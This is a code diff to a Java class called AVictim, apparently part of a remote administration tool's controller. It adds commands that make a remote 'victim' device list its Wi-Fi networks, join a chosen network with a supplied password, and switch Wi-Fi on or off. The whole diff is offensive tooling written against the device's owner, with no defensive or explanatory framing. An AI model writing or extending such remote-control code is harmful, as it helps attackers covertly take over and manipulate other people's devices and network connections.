@@ -79,4 +79,28 @@ public class AVictim extends Victim {
         sendMessage(query);
     }
 
+    public void sendGetWifiList(String owner) {
+        JSONObject query = new JSONObject();
+        query.put("action", "get.wifi.list");
+        query.put("owner", owner);
+        sendMessage(query);
+    }
+
+    public void sendWifiConnect(String ssid, String password, String owner) {
+        JSONObject query = new JSONObject();
+        query.put("action", "wifi.connect");
+        query.put("ssid", ssid);
+        query.put("password", password);
+        query.put("owner", owner);
+        sendMessage(query);
+    }
+
+    public void sendSetWifiEnabled(boolean enabled, String owner) {
+        JSONObject query = new JSONObject();
+        query.put("action", "set.wifi.enabled");
+        query.put("enabled", enabled);
+        query.put("owner", owner);
+        sendMessage(query);
+    }
+
 }
